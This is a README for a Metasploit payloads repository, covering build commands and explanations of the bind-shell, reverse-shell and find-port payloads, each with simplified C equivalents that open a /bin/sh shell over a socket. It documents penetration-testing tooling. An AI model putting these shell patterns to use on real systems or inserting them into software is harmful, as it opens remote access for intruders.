metasploit-payloads
===================

Metasploit's core payloads.


Installing
----------

To build and install the Metasploit's core payloads for your operating
system and architecture as header files, at the **Terminal** or **Command
Prompt**, type

    make && make install

To build and install them as payload modules into your Metasploit's
installation yourself, at the **Terminal** or **Command Prompt**, type

    make && make install-payloads DESTDIR=/path/to/metasploit

Where /path/to/metasploit is the path to your Metasploit's installation
directory. Note that these payloads are already included in Metasploit.


Payload
-------

A payload is the actual code that executes on the target system as the
result of a successful exploitation attempt.


Payload Types
-------------

A payload can be as simple in functionality as a bind shell payload and a
reverse shell payload, or more complex such as the Meterpreter. This section
discusses in more detail the functionality of the Metasploit's core
payloads. Each of the operating systems and architectures supported by
Metasploit is expected to have at least the following payload types:

### Command Shell, Bind TCP Inline (shell_bind_tcp)

The shell_bind_tcp is more or less equivalent to the following C programming
language statements:

    s = socket(AF_INET, SOCK_STREAM, 0);
    bind(s, &sin, sizeof(sin));
    listen(s, 0);
    i = accept(s, NULL, NULL);
    for (j = 2; j >= 0; j--)
        dup2(i, j);
    execl("/bin/sh", "/bin/sh", NULL);

The code above creates a listening TCP socket on the specified port. Upon
accepting a connection, it duplicates the newly created socket descriptor to
the process standard input, output, and error descriptors (i.e., 0, 1, and
2). The port number to which the socket is bound is defined at the LPORT
offset of the shell_bind_tcp (and its value is set to 4444 by default).

### Command Shell, Reverse TCP Inline (shell_reverse_tcp)

The shell_reverse_tcp is more or less equivalent to the following C
programming language statements:

    i = socket(AF_INET, SOCK_STREAM, 0);
    connect(i, &sin, sizeof(sin));
    for (j = 2; j >= 0; j--)
        dup2(i, j);
    execl("/bin/sh", "/bin/sh", NULL);

The code above connects a TCP socket to the specified host on the specified
port. Upon connecting, it duplicates the socket descriptor to the process
standard input, output, and error descriptors (i.e., 0, 1, and 2). The host
address and port number to which the socket is connected is defined at the
LHOST and LPORT offsets of the shell_reverse_tcp (and their values are set
to 127.0.0.1 and 4444 by default).

### Command Shell, Find Port Inline (shell_find_port)

The shell_find_port routine is more or less equivalent to the following C
programming language statements:

    sin_len = sizeof(sin);
    for (i = 0;; i++) {
        getpeername(i, &sin, &sin_len);
        if (*((unsigned short)&sin[2]) == htons(port))
            break;
    }
    for (j = 2; j >= 0; j--)
        dup2(i, j);
    execl("/bin/sh", "/bin/sh", NULL);

The code above walks the process descriptor table searching for the socket
descriptor identified by the port number at CPORT offset of the
shell_find_port. Upon locating, it duplicates the socket descriptor to the
process standard input, output, and error descriptors (i.e., 0, 1, and 2).
The port number by which the socket is identified is defined at the CPORT
offset of the shell_find_port (and its value is set to 4444 by default).
